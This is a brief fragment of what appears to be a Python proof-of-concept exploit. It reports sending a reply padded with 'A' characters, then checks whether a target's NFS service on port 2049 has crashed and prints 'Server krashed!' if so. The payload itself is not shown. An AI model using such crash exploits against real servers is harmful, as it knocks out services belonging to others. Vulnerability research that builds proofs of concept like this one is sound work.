print("[+] Sent GetAddr Reply with A's")

time.sleep(5)
sock2 = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
try:
    sock2.connect((TARGET_IP, 2049))
    print("[-] Server still responding, PoC failed!")
except:
    print("[+] Server krashed!")
